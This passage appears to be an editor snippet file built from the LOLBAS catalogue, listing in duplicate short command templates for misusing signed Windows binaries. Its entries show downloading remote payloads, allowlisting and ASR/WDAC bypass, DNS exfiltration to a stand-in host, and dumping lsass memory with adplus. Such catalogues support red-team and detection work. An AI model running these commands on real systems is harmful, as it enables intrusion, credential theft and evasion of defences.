            "```"
        ],
        "description": "Dxcap.exe is DirectX diagnostics/debugger included with Visual Studio.. it can Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\\path\\to\\writable\\location.ext' as first argument., requires  privilege, category: Execute, it can be used for Local execution of a process as a subprocess of dxcap.exe."
    },
    "lolbas Dxcap.exe Local execution of a process as a subprocess of dxcap.exe": {
        "prefix": "lolbas Dxcap.exe",
        "body": [
            "Dxcap.exe is DirectX diagnostics/debugger included with Visual Studio.. it can Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\\path\\to\\writable\\location.ext' as first argument., requires  privilege, category: Execute, it can be used for Local execution of a process as a subprocess of dxcap.exe.",
            "",
            "```sh",
            "Dxcap.exe -c {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Dxcap.exe is DirectX diagnostics/debugger included with Visual Studio.. it can Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\\path\\to\\writable\\location.ext' as first argument., requires  privilege, category: Execute, it can be used for Local execution of a process as a subprocess of dxcap.exe."
    },
    "VSLaunchBrowser.exe It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process. (lolbas)": {
        "prefix": "VSLaunchBrowser.exe",
        "body": [
            "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Download and execute payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process..",
            "",
            "```sh",
            "VSLaunchBrowser.exe .exe {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Download and execute payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.."
    },
    "lolbas VSLaunchBrowser.exe It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.": {
        "prefix": "lolbas VSLaunchBrowser.exe",
        "body": [
            "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Download and execute payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process..",
            "",
            "```sh",
            "VSLaunchBrowser.exe .exe {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Download and execute payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.."
    },
    "VSLaunchBrowser.exe It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process. (lolbas)": {
        "prefix": "VSLaunchBrowser.exe",
        "body": [
            "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Execute payload via VSLaunchBrowser as parent process, requires  privilege, category: Execute, it can be used for It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process..",
            "",
            "```sh",
            "VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Execute payload via VSLaunchBrowser as parent process, requires  privilege, category: Execute, it can be used for It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.."
    },
    "lolbas VSLaunchBrowser.exe It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.": {
        "prefix": "lolbas VSLaunchBrowser.exe",
        "body": [
            "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Execute payload via VSLaunchBrowser as parent process, requires  privilege, category: Execute, it can be used for It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process..",
            "",
            "```sh",
            "VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Execute payload via VSLaunchBrowser as parent process, requires  privilege, category: Execute, it can be used for It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.."
    },
    "VSLaunchBrowser.exe It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process. (lolbas)": {
        "prefix": "VSLaunchBrowser.exe",
        "body": [
            "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Execute payload from WebDAV server via VSLaunchBrowser as parent process, requires  privilege, category: Execute, it can be used for It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process..",
            "",
            "```sh",
            "VSLaunchBrowser.exe .exe {PATH_SMB}${0}",
            "```"
        ],
        "description": "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Execute payload from WebDAV server via VSLaunchBrowser as parent process, requires  privilege, category: Execute, it can be used for It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.."
    },
    "lolbas VSLaunchBrowser.exe It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.": {
        "prefix": "lolbas VSLaunchBrowser.exe",
        "body": [
            "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Execute payload from WebDAV server via VSLaunchBrowser as parent process, requires  privilege, category: Execute, it can be used for It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process..",
            "",
            "```sh",
            "VSLaunchBrowser.exe .exe {PATH_SMB}${0}",
            "```"
        ],
        "description": "VSLaunchBrowser.exe is Microsoft Visual Studio browser launcher tool for web applications debugging. it can Execute payload from WebDAV server via VSLaunchBrowser as parent process, requires  privilege, category: Execute, it can be used for It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.."
    },
    "Teams.exe Execute JavaScript code (lolbas)": {
        "prefix": "Teams.exe",
        "body": [
            "Teams.exe is Electron runtime binary which runs the Teams application. it can Generate JavaScript payload and package.json, archive in ASAR file and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app.asar\" before executing., requires  privilege, category: Execute, it can be used for Execute JavaScript code.",
            "",
            "```sh",
            "teams.exe${0}",
            "```"
        ],
        "description": "Teams.exe is Electron runtime binary which runs the Teams application. it can Generate JavaScript payload and package.json, archive in ASAR file and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app.asar\" before executing., requires  privilege, category: Execute, it can be used for Execute JavaScript code."
    },
    "lolbas Teams.exe Execute JavaScript code": {
        "prefix": "lolbas Teams.exe",
        "body": [
            "Teams.exe is Electron runtime binary which runs the Teams application. it can Generate JavaScript payload and package.json, archive in ASAR file and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app.asar\" before executing., requires  privilege, category: Execute, it can be used for Execute JavaScript code.",
            "",
            "```sh",
            "teams.exe${0}",
            "```"
        ],
        "description": "Teams.exe is Electron runtime binary which runs the Teams application. it can Generate JavaScript payload and package.json, archive in ASAR file and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app.asar\" before executing., requires  privilege, category: Execute, it can be used for Execute JavaScript code."
    },
    "Teams.exe Executes a process under a trusted Microsoft signed binary (lolbas)": {
        "prefix": "Teams.exe",
        "body": [
            "Teams.exe is Electron runtime binary which runs the Teams application. it can Teams spawns cmd.exe as a child process of teams.exe and executes the ping command, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "teams.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"${0}",
            "```"
        ],
        "description": "Teams.exe is Electron runtime binary which runs the Teams application. it can Teams spawns cmd.exe as a child process of teams.exe and executes the ping command, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary."
    },
    "lolbas Teams.exe Executes a process under a trusted Microsoft signed binary": {
        "prefix": "lolbas Teams.exe",
        "body": [
            "Teams.exe is Electron runtime binary which runs the Teams application. it can Teams spawns cmd.exe as a child process of teams.exe and executes the ping command, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "teams.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"${0}",
            "```"
        ],
        "description": "Teams.exe is Electron runtime binary which runs the Teams application. it can Teams spawns cmd.exe as a child process of teams.exe and executes the ping command, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary."
    },
    "Appvlp.exe Execution of BAT file hosted on Webdav server. (lolbas)": {
        "prefix": "Appvlp.exe",
        "body": [
            "Appvlp.exe is Application Virtualization Utility Included with Microsoft Office 2016. it can Executes .bat file through AppVLP.exe, requires  privilege, category: Execute, it can be used for Execution of BAT file hosted on Webdav server..",
            "",
            "```sh",
            "AppVLP.exe {PATH_SMB:.bat}${0}",
            "```"
        ],
        "description": "Appvlp.exe is Application Virtualization Utility Included with Microsoft Office 2016. it can Executes .bat file through AppVLP.exe, requires  privilege, category: Execute, it can be used for Execution of BAT file hosted on Webdav server.."
    },
    "lolbas Appvlp.exe Execution of BAT file hosted on Webdav server.": {
        "prefix": "lolbas Appvlp.exe",
        "body": [
            "Appvlp.exe is Application Virtualization Utility Included with Microsoft Office 2016. it can Executes .bat file through AppVLP.exe, requires  privilege, category: Execute, it can be used for Execution of BAT file hosted on Webdav server..",
            "",
            "```sh",
            "AppVLP.exe {PATH_SMB:.bat}${0}",
            "```"
        ],
        "description": "Appvlp.exe is Application Virtualization Utility Included with Microsoft Office 2016. it can Executes .bat file through AppVLP.exe, requires  privilege, category: Execute, it can be used for Execution of BAT file hosted on Webdav server.."
    },
    "Appvlp.exe Local execution of process bypassing Attack Surface Reduction (ASR). (lolbas)": {
        "prefix": "Appvlp.exe",
        "body": [
            "Appvlp.exe is Application Virtualization Utility Included with Microsoft Office 2016. it can Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command., requires  privilege, category: Execute, it can be used for Local execution of process bypassing Attack Surface Reduction (ASR)..",
            "",
            "```sh",
            "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)\"${0}",
            "```"
        ],
        "description": "Appvlp.exe is Application Virtualization Utility Included with Microsoft Office 2016. it can Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command., requires  privilege, category: Execute, it can be used for Local execution of process bypassing Attack Surface Reduction (ASR).."
    },
    "lolbas Appvlp.exe Local execution of process bypassing Attack Surface Reduction (ASR).": {
        "prefix": "lolbas Appvlp.exe",
        "body": [
            "Appvlp.exe is Application Virtualization Utility Included with Microsoft Office 2016. it can Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command., requires  privilege, category: Execute, it can be used for Local execution of process bypassing Attack Surface Reduction (ASR)..",
            "",
            "```sh",
            "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)\"${0}",
            "```"
        ],
        "description": "Appvlp.exe is Application Virtualization Utility Included with Microsoft Office 2016. it can Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command., requires  privilege, category: Execute, it can be used for Local execution of process bypassing Attack Surface Reduction (ASR).."
    },
    "dnx.exe Local execution of C# project stored in consoleapp folder. (lolbas)": {
        "prefix": "dnx.exe",
        "body": [
            "dnx.exe is .NET Execution environment file included with .NET.. it can Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies), requires  privilege, category: Execute, it can be used for Local execution of C# project stored in consoleapp folder..",
            "",
            "```sh",
            "dnx.exe {PATH_ABSOLUTE:folder}${0}",
            "```"
        ],
        "description": "dnx.exe is .NET Execution environment file included with .NET.. it can Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies), requires  privilege, category: Execute, it can be used for Local execution of C# project stored in consoleapp folder.."
    },
    "lolbas dnx.exe Local execution of C# project stored in consoleapp folder.": {
        "prefix": "lolbas dnx.exe",
        "body": [
            "dnx.exe is .NET Execution environment file included with .NET.. it can Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies), requires  privilege, category: Execute, it can be used for Local execution of C# project stored in consoleapp folder..",
            "",
            "```sh",
            "dnx.exe {PATH_ABSOLUTE:folder}${0}",
            "```"
        ],
        "description": "dnx.exe is .NET Execution environment file included with .NET.. it can Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies), requires  privilege, category: Execute, it can be used for Local execution of C# project stored in consoleapp folder.."
    },
    "Mspub.exe It will download a remote payload and place it in INetCache. (lolbas)": {
        "prefix": "Mspub.exe",
        "body": [
            "Mspub.exe is Microsoft Publisher. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "mspub.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Mspub.exe is Microsoft Publisher. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "lolbas Mspub.exe It will download a remote payload and place it in INetCache.": {
        "prefix": "lolbas Mspub.exe",
        "body": [
            "Mspub.exe is Microsoft Publisher. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "mspub.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Mspub.exe is Microsoft Publisher. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "msxsl.exe Local execution of script stored in XSL file. (lolbas)": {
        "prefix": "msxsl.exe",
        "body": [
            "msxsl.exe is Command line utility used to perform XSL transformations.. it can Run COM Scriptlet code within the script.xsl file (local)., requires  privilege, category: AWL Bypass, it can be used for Local execution of script stored in XSL file..",
            "",
            "```sh",
            "msxsl.exe {PATH:.xml} {PATH:.xsl}${0}",
            "```"
        ],
        "description": "msxsl.exe is Command line utility used to perform XSL transformations.. it can Run COM Scriptlet code within the script.xsl file (local)., requires  privilege, category: AWL Bypass, it can be used for Local execution of script stored in XSL file.."
    },
    "lolbas msxsl.exe Local execution of script stored in XSL file.": {
        "prefix": "lolbas msxsl.exe",
        "body": [
            "msxsl.exe is Command line utility used to perform XSL transformations.. it can Run COM Scriptlet code within the script.xsl file (local)., requires  privilege, category: AWL Bypass, it can be used for Local execution of script stored in XSL file..",
            "",
            "```sh",
            "msxsl.exe {PATH:.xml} {PATH:.xsl}${0}",
            "```"
        ],
        "description": "msxsl.exe is Command line utility used to perform XSL transformations.. it can Run COM Scriptlet code within the script.xsl file (local)., requires  privilege, category: AWL Bypass, it can be used for Local execution of script stored in XSL file.."
    },
    "msxsl.exe Local execution of remote script stored in XSL script stored as an XML file. (lolbas)": {
        "prefix": "msxsl.exe",
        "body": [
            "msxsl.exe is Command line utility used to perform XSL transformations.. it can Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)., requires  privilege, category: AWL Bypass, it can be used for Local execution of remote script stored in XSL script stored as an XML file..",
            "",
            "```sh",
            "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}${0}",
            "```"
        ],
        "description": "msxsl.exe is Command line utility used to perform XSL transformations.. it can Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)., requires  privilege, category: AWL Bypass, it can be used for Local execution of remote script stored in XSL script stored as an XML file.."
    },
    "lolbas msxsl.exe Local execution of remote script stored in XSL script stored as an XML file.": {
        "prefix": "lolbas msxsl.exe",
        "body": [
            "msxsl.exe is Command line utility used to perform XSL transformations.. it can Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)., requires  privilege, category: AWL Bypass, it can be used for Local execution of remote script stored in XSL script stored as an XML file..",
            "",
            "```sh",
            "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}${0}",
            "```"
        ],
        "description": "msxsl.exe is Command line utility used to perform XSL transformations.. it can Run COM Scriptlet code within the shellcode.xml(xsl) file (remote)., requires  privilege, category: AWL Bypass, it can be used for Local execution of remote script stored in XSL script stored as an XML file.."
    },
    "msxsl.exe Download a file from the internet and save it to disk. (lolbas)": {
        "prefix": "msxsl.exe",
        "body": [
            "msxsl.exe is Command line utility used to perform XSL transformations.. it can Using remote XML and XSL files, save the transformed XML file to disk., requires  privilege, category: Download, it can be used for Download a file from the internet and save it to disk..",
            "",
            "```sh",
            "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}${0}",
            "```"
        ],
        "description": "msxsl.exe is Command line utility used to perform XSL transformations.. it can Using remote XML and XSL files, save the transformed XML file to disk., requires  privilege, category: Download, it can be used for Download a file from the internet and save it to disk.."
    },
    "lolbas msxsl.exe Download a file from the internet and save it to disk.": {
        "prefix": "lolbas msxsl.exe",
        "body": [
            "msxsl.exe is Command line utility used to perform XSL transformations.. it can Using remote XML and XSL files, save the transformed XML file to disk., requires  privilege, category: Download, it can be used for Download a file from the internet and save it to disk..",
            "",
            "```sh",
            "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}${0}",
            "```"
        ],
        "description": "msxsl.exe is Command line utility used to perform XSL transformations.. it can Using remote XML and XSL files, save the transformed XML file to disk., requires  privilege, category: Download, it can be used for Download a file from the internet and save it to disk.."
    },
    "msxsl.exe Download a file from the internet and save it to an NTFS Alternate Data Stream. (lolbas)": {
        "prefix": "msxsl.exe",
        "body": [
            "msxsl.exe is Command line utility used to perform XSL transformations.. it can Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Download a file from the internet and save it to an NTFS Alternate Data Stream..",
            "",
            "```sh",
            "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name${0}",
            "```"
        ],
        "description": "msxsl.exe is Command line utility used to perform XSL transformations.. it can Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Download a file from the internet and save it to an NTFS Alternate Data Stream.."
    },
    "lolbas msxsl.exe Download a file from the internet and save it to an NTFS Alternate Data Stream.": {
        "prefix": "lolbas msxsl.exe",
        "body": [
            "msxsl.exe is Command line utility used to perform XSL transformations.. it can Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Download a file from the internet and save it to an NTFS Alternate Data Stream..",
            "",
            "```sh",
            "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name${0}",
            "```"
        ],
        "description": "msxsl.exe is Command line utility used to perform XSL transformations.. it can Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Download a file from the internet and save it to an NTFS Alternate Data Stream.."
    },
    "TestWindowRemoteAgent.exe Attackers may utilize this to exfiltrate data over DNS (lolbas)": {
        "prefix": "TestWindowRemoteAgent.exe",
        "body": [
            "TestWindowRemoteAgent.exe is TestWindowRemoteAgent.exe is the command-line tool to establish RPC. it can Sends DNS query for open connection to any host, enabling exfiltration over DNS, requires  privilege, category: Upload, it can be used for Attackers may utilize this to exfiltrate data over DNS.",
            "",
            "```sh",
            "TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000${0}",
            "```"
        ],
        "description": "TestWindowRemoteAgent.exe is TestWindowRemoteAgent.exe is the command-line tool to establish RPC. it can Sends DNS query for open connection to any host, enabling exfiltration over DNS, requires  privilege, category: Upload, it can be used for Attackers may utilize this to exfiltrate data over DNS."
    },
    "lolbas TestWindowRemoteAgent.exe Attackers may utilize this to exfiltrate data over DNS": {
        "prefix": "lolbas TestWindowRemoteAgent.exe",
        "body": [
            "TestWindowRemoteAgent.exe is TestWindowRemoteAgent.exe is the command-line tool to establish RPC. it can Sends DNS query for open connection to any host, enabling exfiltration over DNS, requires  privilege, category: Upload, it can be used for Attackers may utilize this to exfiltrate data over DNS.",
            "",
            "```sh",
            "TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000${0}",
            "```"
        ],
        "description": "TestWindowRemoteAgent.exe is TestWindowRemoteAgent.exe is the command-line tool to establish RPC. it can Sends DNS query for open connection to any host, enabling exfiltration over DNS, requires  privilege, category: Upload, it can be used for Attackers may utilize this to exfiltrate data over DNS."
    },
    "vstest.console.exe Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe (lolbas)": {
        "prefix": "vstest.console.exe",
        "body": [
            "vstest.console.exe is VSTest.Console.exe is the command-line tool to run tests. it can VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general, requires  privilege, category: AWL Bypass, it can be used for Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe.",
            "",
            "```sh",
            "vstest.console.exe {PATH:.dll}${0}",
            "```"
        ],
        "description": "vstest.console.exe is VSTest.Console.exe is the command-line tool to run tests. it can VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general, requires  privilege, category: AWL Bypass, it can be used for Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe."
    },
    "lolbas vstest.console.exe Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe": {
        "prefix": "lolbas vstest.console.exe",
        "body": [
            "vstest.console.exe is VSTest.Console.exe is the command-line tool to run tests. it can VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general, requires  privilege, category: AWL Bypass, it can be used for Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe.",
            "",
            "```sh",
            "vstest.console.exe {PATH:.dll}${0}",
            "```"
        ],
        "description": "vstest.console.exe is VSTest.Console.exe is the command-line tool to run tests. it can VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general, requires  privilege, category: AWL Bypass, it can be used for Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe."
    },
    "VisualUiaVerifyNative.exe Execute proxied payload with Microsoft signed binary to bypass WDAC policies (lolbas)": {
        "prefix": "VisualUiaVerifyNative.exe",
        "body": [
            "VisualUiaVerifyNative.exe is A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.. it can Generate Serialized gadget and save to - C:\\Users\\[current user]\\AppData\\Roaminguiverify.config before executing., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass WDAC policies.",
            "",
            "```sh",
            "VisualUiaVerifyNative.exe${0}",
            "```"
        ],
        "description": "VisualUiaVerifyNative.exe is A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.. it can Generate Serialized gadget and save to - C:\\Users\\[current user]\\AppData\\Roaminguiverify.config before executing., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass WDAC policies."
    },
    "lolbas VisualUiaVerifyNative.exe Execute proxied payload with Microsoft signed binary to bypass WDAC policies": {
        "prefix": "lolbas VisualUiaVerifyNative.exe",
        "body": [
            "VisualUiaVerifyNative.exe is A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.. it can Generate Serialized gadget and save to - C:\\Users\\[current user]\\AppData\\Roaminguiverify.config before executing., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass WDAC policies.",
            "",
            "```sh",
            "VisualUiaVerifyNative.exe${0}",
            "```"
        ],
        "description": "VisualUiaVerifyNative.exe is A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.. it can Generate Serialized gadget and save to - C:\\Users\\[current user]\\AppData\\Roaminguiverify.config before executing., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass WDAC policies."
    },
    "Squirrel.exe Download binary (lolbas)": {
        "prefix": "Squirrel.exe",
        "body": [
            "Squirrel.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file and download the nuget package., requires  privilege, category: Download, it can be used for Download binary.",
            "",
            "```sh",
            "squirrel.exe --download {REMOTEURL}${0}",
            "```"
        ],
        "description": "Squirrel.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file and download the nuget package., requires  privilege, category: Download, it can be used for Download binary."
    },
    "lolbas Squirrel.exe Download binary": {
        "prefix": "lolbas Squirrel.exe",
        "body": [
            "Squirrel.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file and download the nuget package., requires  privilege, category: Download, it can be used for Download binary.",
            "",
            "```sh",
            "squirrel.exe --download {REMOTEURL}${0}",
            "```"
        ],
        "description": "Squirrel.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file and download the nuget package., requires  privilege, category: Download, it can be used for Download binary."
    },
    "Squirrel.exe Download and execute binary (lolbas)": {
        "prefix": "Squirrel.exe",
        "body": [
            "Squirrel.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file, download and install the nuget package., requires  privilege, category: Execute, it can be used for Download and execute binary.",
            "",
            "```sh",
            "squirrel.exe --updateRollback={REMOTEURL}${0}",
            "```"
        ],
        "description": "Squirrel.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file, download and install the nuget package., requires  privilege, category: Execute, it can be used for Download and execute binary."
    },
    "lolbas Squirrel.exe Download and execute binary": {
        "prefix": "lolbas Squirrel.exe",
        "body": [
            "Squirrel.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file, download and install the nuget package., requires  privilege, category: Execute, it can be used for Download and execute binary.",
            "",
            "```sh",
            "squirrel.exe --updateRollback={REMOTEURL}${0}",
            "```"
        ],
        "description": "Squirrel.exe is Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.. it can The above binary will go to url and look for RELEASES file, download and install the nuget package., requires  privilege, category: Execute, it can be used for Download and execute binary."
    },
    "Powerpnt.exe It will download a remote payload and place it in INetCache. (lolbas)": {
        "prefix": "Powerpnt.exe",
        "body": [
            "Powerpnt.exe is Microsoft Office binary.. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "Powerpnt.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Powerpnt.exe is Microsoft Office binary.. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "lolbas Powerpnt.exe It will download a remote payload and place it in INetCache.": {
        "prefix": "lolbas Powerpnt.exe",
        "body": [
            "Powerpnt.exe is Microsoft Office binary.. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "Powerpnt.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Powerpnt.exe is Microsoft Office binary.. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "adplus.exe Create memory dump and parse it offline (lolbas)": {
        "prefix": "adplus.exe",
        "body": [
            "adplus.exe is Debugging tool included with Windows Debugging Tools. it can Creates a memory dump of the lsass process, requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline.",
            "",
            "```sh",
            "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet${0}",
            "```"
        ],
        "description": "adplus.exe is Debugging tool included with Windows Debugging Tools. it can Creates a memory dump of the lsass process, requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline."
    },
    "lolbas adplus.exe Create memory dump and parse it offline": {
        "prefix": "lolbas adplus.exe",
        "body": [
            "adplus.exe is Debugging tool included with Windows Debugging Tools. it can Creates a memory dump of the lsass process, requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline.",
            "",
            "```sh",
            "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet${0}",
            "```"
        ],
        "description": "adplus.exe is Debugging tool included with Windows Debugging Tools. it can Creates a memory dump of the lsass process, requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline."
    },
    "adplus.exe Run commands under a trusted Microsoft signed binary (lolbas)": {
        "prefix": "adplus.exe",
        "body": [
            "adplus.exe is Debugging tool included with Windows Debugging Tools. it can Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required., requires  privilege, category: Execute, it can be used for Run commands under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "adplus.exe -crash -o \"{PATH_ABSOLUTE:folder}\" -sc {PATH:.exe}${0}",
            "```"
        ],
        "description": "adplus.exe is Debugging tool included with Windows Debugging Tools. it can Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required., requires  privilege, category: Execute, it can be used for Run commands under a trusted Microsoft signed binary."
    },
    "lolbas adplus.exe Run commands under a trusted Microsoft signed binary": {
        "prefix": "lolbas adplus.exe",
        "body": [
            "adplus.exe is Debugging tool included with Windows Debugging Tools. it can Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required., requires  privilege, category: Execute, it can be used for Run commands under a trusted Microsoft signed binary.",
            "",
            "```sh",
